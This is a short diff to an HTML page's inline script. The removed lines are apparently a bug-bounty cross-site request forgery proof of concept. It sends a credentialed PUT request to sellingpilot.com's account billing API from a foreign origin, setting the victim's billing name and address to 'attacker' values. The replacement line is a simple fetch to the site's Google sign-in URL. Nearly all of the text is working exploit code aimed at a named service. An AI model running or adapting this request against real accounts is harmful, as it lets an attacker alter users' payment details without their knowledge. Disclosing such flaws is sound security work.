@@ -5,43 +5,8 @@
 </head>
 <body>
 <script>
-  fetch("https://www.sellingpilot.com/api/account/payment/billing-to?_xhr=true", {
-  method: "PUT",
-  headers: {
-    "Accept": "application/json, text/javascript, */*",
-    "Accept-Language": "en-us",
-    "Content-Type": "text/plain",
-    "Origin": "https://www.kadal.com",
-    "Referer": "https://www.sellingpilot.com/account/billing/payment-info",
-    "Priority": "u=0",
-    "Sec-Fetch-Dest": "empty",
-    "Sec-Fetch-Mode": "cors",
-    "Sec-Fetch-Site": "same-origin",
-  },
-  body: JSON.stringify({
-    firstName: "attacker",
-    lastName: "hackerone",
-    addressLine1: "jalan candiwulan nomer 1",
-    addressLine2: "desa gandusari rt 1 rw 2",
-    city: "kebumen",
-    countryCode: "ID",
-    stateCode: "AC",
-    postalCode: "54366",
-    vatGstId: "",
-    countryTranslations: {
-      "en-us": "Indonesia",
-      "zh-cn": "印度尼西亚",
-      "zh-tw": "印度尼西亞",
-    },
-    stateTranslations: {
-      "en-us": "Aceh",
-      "zh-cn": "Aceh",
-      "zh-tw": "Aceh",
-    },
-  }),
-  credentials: "include"
-})
-</script>
+ fetch('https://www.sellingpilot.com/sign-in/google?returnUrl=%2Fdashboard%2Fhome')
+ </script>
  
 
 </body>
